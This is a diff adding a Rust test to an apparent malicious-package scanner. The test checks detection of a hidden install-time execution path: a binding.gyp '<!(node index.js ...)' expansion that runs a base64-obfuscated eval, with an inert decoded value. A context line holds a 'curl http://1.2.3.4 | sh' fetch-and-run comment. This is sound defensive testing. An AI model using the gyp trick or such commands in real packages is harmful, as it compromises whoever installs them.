@@ -225,6 +225,51 @@ fn install_hooks_follow_named_scripts_and_bun_run() {
 }
 
 #[test]
+fn binding_gyp_command_expansions_run_at_install() {
+    // npm adds `install: node-gyp rebuild` for a root binding.gyp, and node-gyp runs the
+    // `<!(...)` commands while configuring.
+    let pj = r#"{"name": "gy", "version": "1.0.0", "main": "dist/index.js"}"#;
+    let gyp = r#"{"targets": [{"target_name": "x", "type": "none",
+        "sources": ["<!(node index.js > /dev/null 2>&1 && echo stub.c)"]}]}"#;
+    let payload = "eval(Buffer.from('aWQ=', 'base64').toString());\n";
+    let bytes = tar_gz_files(&[
+        ("package/package.json", pj),
+        ("package/binding.gyp", gyp),
+        ("package/index.js", payload),
+        ("package/dist/index.js", "module.exports = 1;\n"),
+    ]);
+    let r = scan(&bytes, "gy-1.0.0.tgz");
+    assert_eq!(
+        r.install_surface,
+        vec![
+            "package.json:scripts.install (implicit, binding.gyp)",
+            "binding.gyp",
+            "index.js",
+            "dist/index.js"
+        ]
+    );
+    assert_eq!(r.features["n_npm_install_scripts"], 1.0);
+    assert_eq!(r.features["inst_dyn_code"], 1.0);
+
+    // An install hook of its own replaces the implicit one; `gypfile: false` turns gyp off.
+    for pj in [
+        r#"{"name": "gy", "version": "1.0.0", "main": "dist/index.js",
+            "scripts": {"install": "echo ok"}}"#,
+        r#"{"name": "gy", "version": "1.0.0", "main": "dist/index.js", "gypfile": false}"#,
+    ] {
+        let bytes = tar_gz_files(&[
+            ("package/package.json", pj),
+            ("package/binding.gyp", gyp),
+            ("package/index.js", payload),
+            ("package/dist/index.js", "module.exports = 1;\n"),
+        ]);
+        let r = scan(&bytes, "gy-1.0.0.tgz");
+        assert!(!r.install_surface.iter().any(|p| p == "index.js"), "{pj}");
+        assert_eq!(r.features["inst_dyn_code"], 0.0);
+    }
+}
+
+#[test]
 fn comments_do_not_count_end_to_end() {
     let setup = "# import subprocess; subprocess.call('curl http://1.2.3.4 | sh')\n'''\nos.system is not called\n'''\nfrom setuptools import setup\nsetup(name='quiet')\n";
     let bytes = tar_gz_files(&[("quiet-1.0/setup.py", setup)]);
